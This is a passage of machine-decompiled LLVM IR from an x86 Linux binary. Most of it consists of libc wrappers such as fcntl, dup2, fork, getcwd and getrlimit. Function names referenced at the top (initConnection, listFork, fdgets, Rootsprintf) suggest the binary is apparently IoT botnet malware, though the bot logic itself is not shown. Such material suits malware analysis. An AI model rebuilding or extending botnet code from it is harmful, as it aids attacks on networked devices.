  uselistorder i1* %cf.global-to-local, { 56, 57, 1, 0, 116, 2, 3, 10, 4, 5, 6, 7, 8, 9, 117, 11, 12, 13, 17, 18, 14, 15, 16, 19, 20, 21, 22, 23, 114, 26, 24, 25, 115, 27, 28, 113, 29, 30, 32, 33, 31, 34, 35, 36, 37, 112, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 55, 49, 50, 51, 52, 53, 54, 58, 59, 60, 63, 61, 62, 118, 64, 65, 66, 67, 68, 74, 75, 69, 70, 71, 111, 72, 73, 76, 77, 78, 81, 82, 83, 84, 85, 79, 80, 89, 90, 86, 87, 88, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110 }
  uselistorder i32 (i32, i32)* @__GI_strtok, { 9, 8, 1, 0, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @fdgets, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @szprintf, { 1, 0 }
  uselistorder i32 ()* @listFork, { 7, 1, 0, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32)* @__GI_toupper, { 3, 2, 1, 0 }
  uselistorder i8 13, { 0, 2, 1 }
  uselistorder i8 33, { 0, 2, 1 }
  uselistorder [5 x i8]* @global_var_8055a6a.146, { 1, 0 }
  uselistorder i32 ()* @trim, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @Rootsprintf, { 1, 0, 2 }
  uselistorder i32 (i32)* @__GI_inet_ntoa, { 1, 0 }
  uselistorder i32 ()* @sleep, { 1, 0 }
  uselistorder i32 ()* @initConnection, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @__libc_waitpid, { 2, 1, 0 }
  uselistorder i32 (i32)* @zprintf, { 2, 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_8055b18.171 to i32), { 0, 2, 1, 3 }
  uselistorder i32 (i32)* @__libc_fork, { 4, 3, 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_8055b0c.168 to i8*), { 1, 0 }
  uselistorder i32 ptrtoint ([13 x i8]* @global_var_8055aff.167 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_8055afd.166 to i32), { 0, 2, 1 }
  uselistorder i32 ptrtoint ([19 x i8]* @global_var_8055aea.165 to i32), { 0, 2, 1 }
  uselistorder i32* inttoptr (i32 8 to i32*), { 3, 4, 0, 1, 2 }
  uselistorder i32 (i32)* @init_rand, { 1, 0 }
  uselistorder i32 (i32)* @srand, { 2, 1, 0 }
  uselistorder i32 (i32*)* @__GI_time, { 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 0, 18, 19, 20, 1, 2, 3, 4, 5, 6, 7, 21, 22 }
  uselistorder i32* inttoptr (i32 12 to i32*), { 6, 0, 1, 2, 3, 7, 5, 4 }
  uselistorder i32 ptrtoint (i32* @global_var_8055ae9.164 to i32), { 0, 3, 2, 4, 1 }
  uselistorder label %dec_label_pc_804d58a.outer31, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804d58a.outer26, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d569, { 1, 0 }
  uselistorder label %dec_label_pc_804d51f, { 1, 0 }
  uselistorder label %dec_label_pc_804d48c, { 1, 0 }
  uselistorder label %dec_label_pc_804d460, { 1, 0 }
  uselistorder label %dec_label_pc_804d42a, { 1, 0 }
  uselistorder label %dec_label_pc_804d31c, { 1, 0 }
  uselistorder label %dec_label_pc_804d30b, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d302, { 1, 0 }
  uselistorder label %dec_label_pc_804d29e, { 1, 0 }
  uselistorder label %dec_label_pc_804d236, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d22d, { 1, 0 }
  uselistorder label %dec_label_pc_804d202, { 1, 0 }
  uselistorder label %dec_label_pc_804d112, { 1, 0 }
  uselistorder label %dec_label_pc_804d0a3, { 1, 0 }
  uselistorder label %dec_label_pc_804d081, { 1, 0 }
  uselistorder label %dec_label_pc_804cfc9, { 1, 0 }
  uselistorder label %dec_label_pc_804cf9f, { 1, 0 }
  uselistorder label %dec_label_pc_804cf10, { 1, 0 }
  uselistorder label %dec_label_pc_804cf07.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804cee1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ce68, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_804cd63, { 1, 0 }
  uselistorder label %dec_label_pc_804ccc1, { 1, 0 }
}

define i32 @__vfork() local_unnamed_addr {
entry:
  %v0_804d5c2 = call i32 @vfork()
  %v5_804d5c5 = icmp ult i32 %v0_804d5c2, -4095
  %v1_804d5ca = icmp eq i1 %v5_804d5c5, false
  call void @__pseudo_cond_branch(i1 %v1_804d5ca, i32 134551536)
  ret i32 %v0_804d5c2
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_804d5d4 = load i32, i32* @edi, align 4
  %v0_804d5d5 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804d5e9 = add i32 %arg2, -12
  store i32 %arg3, i32* @edx, align 4
  %v6_804d5f3 = icmp ugt i32 %v1_804d5e9, 2
  br i1 %v6_804d5f3, label %dec_label_pc_804d603, label %dec_label_pc_804d5f5

dec_label_pc_804d5f5:                             ; preds = %entry
  %v4_804d5f9 = call i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %v1_804d5e9)
  br label %dec_label_pc_804d625

dec_label_pc_804d603:                             ; preds = %entry
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v2_804d60b = call i32 (i32, i32, ...) @fcntl(i32 %arg1, i32 %arg2)
  store i32 %v2_804d60b, i32* %ebx.global-to-local, align 4
  %tmp17 = icmp ult i32 %v2_804d60b, -4095
  br i1 %tmp17, label %dec_label_pc_804d623, label %dec_label_pc_804d617

dec_label_pc_804d617:                             ; preds = %dec_label_pc_804d603
  %v1_804d617 = call i32 @__errno_location(i32 %v0_804d5d5)
  %v0_804d61c = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d61c = sub i32 0, %v0_804d61c
  %v2_804d61e = inttoptr i32 %v1_804d617 to i32*
  store i32 %v1_804d61c, i32* %v2_804d61e, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d623

dec_label_pc_804d623:                             ; preds = %dec_label_pc_804d603, %dec_label_pc_804d617
  %v0_804d623 = phi i32 [ %v2_804d60b, %dec_label_pc_804d603 ], [ -1, %dec_label_pc_804d617 ]
  br label %dec_label_pc_804d625

dec_label_pc_804d625:                             ; preds = %dec_label_pc_804d5f5, %dec_label_pc_804d623
  %v0_804d62a = phi i32 [ %v4_804d5f9, %dec_label_pc_804d5f5 ], [ %v0_804d623, %dec_label_pc_804d623 ]
  store i32 %v0_804d5d5, i32* @ebx, align 4
  store i32 %v0_804d5d4, i32* @edi, align 4
  ret i32 %v0_804d62a

; uselistorder directives
  uselistorder i32 %v2_804d60b, { 1, 0, 2 }
  uselistorder i32 %v0_804d5d5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 3, 2 }
  uselistorder i32 %arg1, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_804d625, { 1, 0 }
  uselistorder label %dec_label_pc_804d623, { 1, 0 }
}

define i32 @__GI_fcntl64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d62c = load i32, i32* @edi, align 4
  store i32 %v0_804d62c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* @ecx, align 4
  store i32 %arg3, i32* @edx, align 4
  %v0_804d644 = load i32, i32* @ebx, align 4
  %v1_804d64c = call i32 @int80_syscall(i32 221)
  store i32 %v1_804d64c, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_804d64c, -4095
  br i1 %tmp11, label %dec_label_pc_804d664, label %dec_label_pc_804d658

dec_label_pc_804d658:                             ; preds = %entry
  %v1_804d658 = call i32 @__errno_location(i32 %v0_804d644)
  %v0_804d65d = load i32, i32* %edi.global-to-local, align 4
  %v1_804d65d = sub i32 0, %v0_804d65d
  %v2_804d65f = inttoptr i32 %v1_804d658 to i32*
  store i32 %v1_804d65d, i32* %v2_804d65f, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d664

dec_label_pc_804d664:                             ; preds = %entry, %dec_label_pc_804d658
  %v0_804d664 = phi i32 [ %v1_804d64c, %entry ], [ -1, %dec_label_pc_804d658 ]
  %v2_804d669 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d669, i32* %edi.global-to-local, align 4
  ret i32 %v0_804d664

; uselistorder directives
  uselistorder i32 %v1_804d64c, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d664, { 1, 0 }
}

; Function Attrs: noreturn
define i32 @__GI__exit(i32 %arg1) local_unnamed_addr #0 {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_804d66d = load i32, i32* @ebx, align 4
  store i32 %v0_804d66d, i32* %stack_var_-8, align 4
  %v5_804d66e = icmp ult i32* %stack_var_-8, inttoptr (i32 4 to i32*)
  store i1 %v5_804d66e, i1* @cf, align 1
  store i32 %arg1, i32* @edi, align 4
  store i32 %arg1, i32* @ebx, align 4
  call void @exit(i32 %arg1)
  unreachable

; uselistorder directives
  uselistorder i1* @cf, { 2, 0, 1 }
  uselistorder i32* inttoptr (i32 4 to i32*), { 2, 0, 1 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d694 = load i32, i32* @edi, align 4
  store i32 %v0_804d694, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_804d69c = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_804d6a4 = call i32 @chdir(i32 %v0_804d69c)
  store i32 %v0_804d69c, i32* @ebx, align 4
  store i32 %v1_804d6a4, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804d6a4, -4095
  br i1 %tmp8, label %dec_label_pc_804d6bc, label %dec_label_pc_804d6b0

dec_label_pc_804d6b0:                             ; preds = %entry
  %v1_804d6b0 = call i32 @__errno_location(i32 %v0_804d69c)
  %v0_804d6b5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804d6b5 = sub i32 0, %v0_804d6b5
  %v2_804d6b7 = inttoptr i32 %v1_804d6b0 to i32*
  store i32 %v1_804d6b5, i32* %v2_804d6b7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d6bc

dec_label_pc_804d6bc:                             ; preds = %entry, %dec_label_pc_804d6b0
  %v0_804d6bc = phi i32 [ %v1_804d6a4, %entry ], [ -1, %dec_label_pc_804d6b0 ]
  %v2_804d6be = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d6be, i32* @edx, align 4
  %v2_804d6c0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d6c0, i32* @edi, align 4
  ret i32 %v0_804d6bc

; uselistorder directives
  uselistorder i32 %v1_804d6a4, { 1, 0, 2 }
  uselistorder i32 %v0_804d69c, { 1, 0, 2 }
  uselistorder i32 (i32)* @chdir, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d6bc, { 1, 0 }
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d6c4 = load i32, i32* @edi, align 4
  store i32 %v0_804d6c4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_804d6cc = load i32, i32* @ebx, align 4
  %v1_804d6d4 = call i32 @close(i32 %arg1)
  store i32 %v0_804d6cc, i32* @ebx, align 4
  store i32 %v1_804d6d4, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804d6d4, -4095
  br i1 %tmp8, label %dec_label_pc_804d6ec, label %dec_label_pc_804d6e0

dec_label_pc_804d6e0:                             ; preds = %entry
  %v1_804d6e0 = call i32 @__errno_location(i32 %v0_804d6cc)
  %v0_804d6e5 = load i32, i32* %edi.global-to-local, align 4
  %v1_804d6e5 = sub i32 0, %v0_804d6e5
  %v2_804d6e7 = inttoptr i32 %v1_804d6e0 to i32*
  store i32 %v1_804d6e5, i32* %v2_804d6e7, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_804d6ec

dec_label_pc_804d6ec:                             ; preds = %entry, %dec_label_pc_804d6e0
  %v0_804d6ec = phi i32 [ %v1_804d6d4, %entry ], [ -1, %dec_label_pc_804d6e0 ]
  %v2_804d6ee = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d6ee, i32* @edx, align 4
  %v2_804d6f0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d6f0, i32* @edi, align 4
  ret i32 %v0_804d6ec

; uselistorder directives
  uselistorder i32 %v1_804d6d4, { 1, 0, 2 }
  uselistorder i32 %v0_804d6cc, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804d6ec, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804d6f4 = load i32, i32* @ebx, align 4
  store i32 %v0_804d6f4, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_804d707 = call i32 @dup2(i32 %v0_804d6f4, i32 %tmp4)
  store i32 %v2_804d707, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_804d707, -4095
  br i1 %tmp8, label %dec_label_pc_804d720, label %dec_label_pc_804d714

dec_label_pc_804d714:                             ; preds = %entry
  %v0_804d714 = load i32, i32* %stack_var_-4, align 4
  %v1_804d714 = call i32 @__errno_location(i32 %v0_804d714)
  %v0_804d719 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d719 = sub i32 0, %v0_804d719
  %v2_804d71b = inttoptr i32 %v1_804d714 to i32*
  store i32 %v1_804d719, i32* %v2_804d71b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d720

dec_label_pc_804d720:                             ; preds = %entry, %dec_label_pc_804d714
  %v0_804d720 = phi i32 [ %v2_804d707, %entry ], [ -1, %dec_label_pc_804d714 ]
  %v2_804d724 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d724, i32* @ebx, align 4
  ret i32 %v0_804d720

; uselistorder directives
  uselistorder i32 %v2_804d707, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 (i32, i32)* @dup2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804d720, { 1, 0 }
}

define i32 @__libc_fork(i32 %arg1) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d728 = load i32, i32* @ebx, align 4
  store i32 %v0_804d728, i32* %stack_var_-4, align 4
  %v1_804d731 = call i32 @fork(i32 %v0_804d728)
  store i32 %v1_804d731, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804d731, -4095
  br i1 %tmp6, label %dec_label_pc_804d748, label %dec_label_pc_804d73c

dec_label_pc_804d73c:                             ; preds = %entry
  %v0_804d73c = load i32, i32* %stack_var_-4, align 4
  %v1_804d73c = call i32 @__errno_location(i32 %v0_804d73c)
  %v0_804d741 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d741 = sub i32 0, %v0_804d741
  %v2_804d743 = inttoptr i32 %v1_804d73c to i32*
  store i32 %v1_804d741, i32* %v2_804d743, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d748

dec_label_pc_804d748:                             ; preds = %entry, %dec_label_pc_804d73c
  %v0_804d748 = phi i32 [ %v1_804d731, %entry ], [ -1, %dec_label_pc_804d73c ]
  %v2_804d74a = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804d74a, i32* @edx, align 4
  %v2_804d74c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d74c, i32* @ebx, align 4
  ret i32 %v0_804d748

; uselistorder directives
  uselistorder i32 %v1_804d731, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d748, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp11, i32* %stack_var_-44, align 4
  %tmp12 = call i32 @__decompiler_undefined_function_0()
  %v0_804d750 = load i32, i32* @ebp, align 4
  %v0_804d751 = load i32, i32* @edi, align 4
  %v0_804d752 = load i32, i32* @esi, align 4
  %v0_804d753 = load i32, i32* @ebx, align 4
  store i32 %arg2, i32* @ebp, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_804d75f = icmp eq i32 %arg2, 0
  %v1_804d761 = icmp eq i1 %v1_804d75f, false
  br i1 %v1_804d761, label %dec_label_pc_804d78c, label %dec_label_pc_804d763

dec_label_pc_804d763:                             ; preds = %entry
  %v1_804d763 = icmp eq i32 %arg1, 0
  br i1 %v1_804d763, label %dec_label_pc_804d777, label %dec_label_pc_804d767

dec_label_pc_804d767:                             ; preds = %dec_label_pc_804d763
  %v1_804d767 = call i32 @__errno_location(i32 %v0_804d753)
  %v1_804d76c = inttoptr i32 %v1_804d767 to i32*
  store i32 22, i32* %v1_804d76c, align 4
  br label %dec_label_pc_804d7fd

dec_label_pc_804d777:                             ; preds = %dec_label_pc_804d763
  %v3_804d777 = call i32 @__GI_getpagesize(i32 %v0_804d753, i32 %v0_804d752, i32 %v0_804d751)
  store i32 %v3_804d777, i32* @ebx, align 4
  %v5_804d783 = icmp slt i32 %v3_804d777, 4096
  br i1 %v5_804d783, label %dec_label_pc_804d785, label %dec_label_pc_804d794

dec_label_pc_804d785:                             ; preds = %dec_label_pc_804d777
  store i32 4096, i32* @ebx, align 4
  br label %dec_label_pc_804d794

dec_label_pc_804d78c:                             ; preds = %entry
  store i32 %arg2, i32* @ebx, align 4
  store i32 %arg1, i32* @esi, align 4
  %v1_804d790 = icmp eq i32 %arg1, 0
  %v1_804d792 = icmp eq i1 %v1_804d790, false
  br i1 %v1_804d792, label %dec_label_pc_804d7a6, label %dec_label_pc_804d794

dec_label_pc_804d794:                             ; preds = %dec_label_pc_804d777, %dec_label_pc_804d78c, %dec_label_pc_804d785
  %v0_804d797 = phi i32 [ %v3_804d777, %dec_label_pc_804d777 ], [ %arg2, %dec_label_pc_804d78c ], [ 4096, %dec_label_pc_804d785 ]
  store i32 %v0_804d797, i32* %stack_var_-44, align 4
  %v1_804d798 = call i32 @malloc(i32 %v0_804d797)
  store i32 %v1_804d798, i32* @esi, align 4
  %v1_804d7a2 = icmp eq i32 %v1_804d798, 0
  br i1 %v1_804d7a2, label %dec_label_pc_804d7fd, label %dec_label_pc_804d794.dec_label_pc_804d7a6_crit_edge

dec_label_pc_804d794.dec_label_pc_804d7a6_crit_edge: ; preds = %dec_label_pc_804d794
  %v0_804d7b1.pre = load i32, i32* %stack_var_-44, align 4
  br label %dec_label_pc_804d7a6

dec_label_pc_804d7a6:                             ; preds = %dec_label_pc_804d794.dec_label_pc_804d7a6_crit_edge, %dec_label_pc_804d78c
  %v0_804d7b1 = phi i32 [ %v0_804d7b1.pre, %dec_label_pc_804d794.dec_label_pc_804d7a6_crit_edge ], [ %tmp11, %dec_label_pc_804d78c ]
  %v0_804d7a6 = phi i32 [ %v1_804d798, %dec_label_pc_804d794.dec_label_pc_804d7a6_crit_edge ], [ %arg1, %dec_label_pc_804d78c ]
  store i32 %v0_804d7a6, i32* @ebx, align 4
  %v2_804d7b1 = call i32 @getcwd(i32 %v0_804d7b1, i32 %tmp12)
  %v0_804d7b3 = load i32, i32* @ebx, align 4
  store i32 %v0_804d7b3, i32* @edx, align 4
  store i32 %v2_804d7b1, i32* @ebx, align 4
  %tmp18 = icmp ult i32 %v2_804d7b1, -4095
  br i1 %tmp18, label %dec_label_pc_804d7c9, label %dec_label_pc_804d7be

dec_label_pc_804d7be:                             ; preds = %dec_label_pc_804d7a6
  %v0_804d7be = load i32, i32* %stack_var_-44, align 4
  %v1_804d7be = call i32 @__errno_location(i32 %v0_804d7be)
  %v0_804d7c3 = load i32, i32* @ebx, align 4
  %v1_804d7c3 = sub i32 0, %v0_804d7c3
  store i32 %v1_804d7c3, i32* @ebx, align 4
  %v2_804d7c5 = inttoptr i32 %v1_804d7be to i32*
  store i32 %v1_804d7c3, i32* %v2_804d7c5, align 4
  br label %dec_label_pc_804d7eb

dec_label_pc_804d7c9:                             ; preds = %dec_label_pc_804d7a6
  %v2_804d7c9 = icmp slt i32 %v2_804d7b1, 0
  br i1 %v2_804d7c9, label %dec_label_pc_804d7eb, label %dec_label_pc_804d7cd

dec_label_pc_804d7cd:                             ; preds = %dec_label_pc_804d7c9
  %v0_804d7cd = load i32, i32* @edi, align 4
  %v1_804d7cd = icmp eq i32 %v0_804d7cd, 0
  %v1_804d7cf = icmp eq i1 %v1_804d7cd, false
  br i1 %v1_804d7cf, label %dec_label_pc_804d7ff, label %dec_label_pc_804d7d1

dec_label_pc_804d7d1:                             ; preds = %dec_label_pc_804d7cd
  br i1 %v1_804d761, label %dec_label_pc_804d7e7, label %dec_label_pc_804d7d5

dec_label_pc_804d7d5:                             ; preds = %dec_label_pc_804d7d1
  %v0_804d7d8 = load i32, i32* @esi, align 4
  store i32 %v0_804d7d8, i32* %stack_var_-44, align 4
  %v4_804d7d9 = inttoptr i32 %v0_804d7d8 to i32*
  %v5_804d7d9 = call i32 @realloc(i32* %v4_804d7d9, i32 %v2_804d7b1, i32 %v0_804d7b3, i32 %v0_804d7b3)
  %v1_804d7e3 = icmp eq i32 %v5_804d7d9, 0
  %v1_804d7e5 = icmp eq i1 %v1_804d7e3, false
  br i1 %v1_804d7e5, label %dec_label_pc_804d7ff, label %dec_label_pc_804d7e7

dec_label_pc_804d7e7:                             ; preds = %dec_label_pc_804d7d5, %dec_label_pc_804d7d1
  %v0_804d7e7 = load i32, i32* @esi, align 4
  br label %dec_label_pc_804d7ff

dec_label_pc_804d7eb:                             ; preds = %dec_label_pc_804d7c9, %dec_label_pc_804d7be
  %v0_804d7eb = load i32, i32* @edi, align 4
  %v1_804d7eb = icmp eq i32 %v0_804d7eb, 0
  %v1_804d7ed = icmp eq i1 %v1_804d7eb, false
  br i1 %v1_804d7ed, label %dec_label_pc_804d7fd, label %dec_label_pc_804d7ef

dec_label_pc_804d7ef:                             ; preds = %dec_label_pc_804d7eb
  %v0_804d7f2 = load i32, i32* @esi, align 4
  store i32 %v0_804d7f2, i32* %stack_var_-44, align 4
  %v1_804d7f3 = call i32 @free(i32 %v0_804d7f2)
  %v0_804d802.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_804d7ff

dec_label_pc_804d7fd:                             ; preds = %dec_label_pc_804d7eb, %dec_label_pc_804d794, %dec_label_pc_804d767
  br label %dec_label_pc_804d7ff

dec_label_pc_804d7ff:                             ; preds = %dec_label_pc_804d7d5, %dec_label_pc_804d7cd, %dec_label_pc_804d7ef, %dec_label_pc_804d7e7, %dec_label_pc_804d7fd
  %v0_804d802 = phi i32 [ %v5_804d7d9, %dec_label_pc_804d7d5 ], [ %v0_804d7cd, %dec_label_pc_804d7cd ], [ %v0_804d802.pre, %dec_label_pc_804d7ef ], [ %v0_804d7e7, %dec_label_pc_804d7e7 ], [ 0, %dec_label_pc_804d7fd ]
  store i32 %v0_804d753, i32* @ebx, align 4
  store i32 %v0_804d752, i32* @esi, align 4
  store i32 %v0_804d751, i32* @edi, align 4
  store i32 %v0_804d750, i32* @ebp, align 4
  ret i32 %v0_804d802

; uselistorder directives
  uselistorder i32 %v2_804d7b1, { 1, 2, 0, 3 }
  uselistorder i32 %v1_804d798, { 0, 2, 1 }
  uselistorder i32 %v0_804d797, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 3, 4, 2, 0, 5, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder i32 %arg1, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_804d7ff, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_804d794, { 1, 2, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_804d80f = ptrtoint i32* %stack_var_-8 to i32
  %v2_804d816 = call i32 @getrlimit(i32 7, i32 %v2_804d80f)
  store i32 256, i32* @edx, align 4
  %v2_804d823 = icmp slt i32 %v2_804d816, 0
  br i1 %v2_804d823, label %dec_label_pc_804d82b, label %dec_label_pc_804d827

dec_label_pc_804d827:                             ; preds = %entry
  %v3_804d827 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_804d827, i32* @edx, align 4
  br label %dec_label_pc_804d82b

dec_label_pc_804d82b:                             ; preds = %entry, %dec_label_pc_804d827
  %v0_804d82b = phi i32 [ 256, %entry ], [ %v3_804d827, %dec_label_pc_804d827 ]
  ret i32 %v0_804d82b

; uselistorder directives
  uselistorder label %dec_label_pc_804d82b, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_804d834 = load i32, i32* @global_var_805e710.178, align 16
  %v1_804d83e = icmp eq i32 %v0_804d834, 0
  br i1 %v1_804d83e, label %dec_label_pc_804d844, label %dec_label_pc_804d842

dec_label_pc_804d842:                             ; preds = %entry
  br label %dec_label_pc_804d844

dec_label_pc_804d844:                             ; preds = %entry, %dec_label_pc_804d842
  %storemerge = phi i32 [ %v0_804d834, %dec_label_pc_804d842 ], [ 4096, %entry ]
  %v0_804d844 = phi i32 [ %v0_804d834, %dec_label_pc_804d842 ], [ 4096, %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_804d844

; uselistorder directives
  uselistorder label %dec_label_pc_804d844, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d848 = load i32, i32* @ebx, align 4
  store i32 %v0_804d848, i32* %stack_var_-4, align 4
  %v1_804d851 = call i32 @getpid(i32 %v0_804d848)
  store i32 %v1_804d851, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_804d851, -4095
  br i1 %tmp6, label %dec_label_pc_804d868, label %dec_label_pc_804d85c

dec_label_pc_804d85c:                             ; preds = %entry
  %v0_804d85c = load i32, i32* %stack_var_-4, align 4
  %v1_804d85c = call i32 @__errno_location(i32 %v0_804d85c)
  %v0_804d861 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d861 = sub i32 0, %v0_804d861
  %v2_804d863 = inttoptr i32 %v1_804d85c to i32*
  store i32 %v1_804d861, i32* %v2_804d863, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d868

dec_label_pc_804d868:                             ; preds = %entry, %dec_label_pc_804d85c
  %v0_804d868 = phi i32 [ %v1_804d851, %entry ], [ -1, %dec_label_pc_804d85c ]
  %v2_804d86c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d86c, i32* @ebx, align 4
  ret i32 %v0_804d868

; uselistorder directives
  uselistorder i32 %v1_804d851, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804d868, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804d870 = load i32, i32* @ebx, align 4
  store i32 %v0_804d870, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_804d883 = call i32 @int80_syscall(i32 191)
  store i32 %v1_804d883, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_804d883, -4095
  br i1 %tmp8, label %dec_label_pc_804d89c, label %dec_label_pc_804d890

dec_label_pc_804d890:                             ; preds = %entry
  %v0_804d890 = load i32, i32* %stack_var_-4, align 4
  %v1_804d890 = call i32 @__errno_location(i32 %v0_804d890)
  %v0_804d895 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804d895 = sub i32 0, %v0_804d895
  %v2_804d897 = inttoptr i32 %v1_804d890 to i32*
  store i32 %v1_804d895, i32* %v2_804d897, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804d89c

dec_label_pc_804d89c:                             ; preds = %entry, %dec_label_pc_804d890
  %v0_804d89c = phi i32 [ %v1_804d883, %entry ], [ -1, %dec_label_pc_804d890 ]
  %v2_804d8a0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804d8a0, i32* @ebx, align 4
  ret i32 %v0_804d89c

